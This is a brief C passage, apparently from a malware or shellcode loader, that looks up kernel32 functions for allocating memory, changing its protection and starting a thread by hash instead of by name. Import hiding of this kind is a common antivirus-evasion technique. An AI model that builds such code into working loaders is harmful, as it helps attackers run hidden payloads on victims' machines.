...
{
	pApiTable->hKernel32 = CustomGetModuleHandleH(KERNEL32_HASH);
	pApiTable->pVirtualAlloc = (ftVirtualAlloc)GetProcAddressReplacementH(pApiTable->hKernel32, VIRTUALALLOC_HASH);
	pApiTable->pVirtualProtect = (ftVirtualProtect)GetProcAddressReplacementH(pApiTable->hKernel32, VIRTUALPROTECT_HASH);
	pApiTable->pCreateThread = (ftCreateThread)GetProcAddressReplacementH(pApiTable->hKernel32, CREATETHREAD_HASH);
	pApiTable->pWaitForSingleObject = (ftWaitForSingleObject)GetProcAddressReplacementH(pApiTable->hKernel32, WAITFORSINGLEOBJECT_HASH);
}
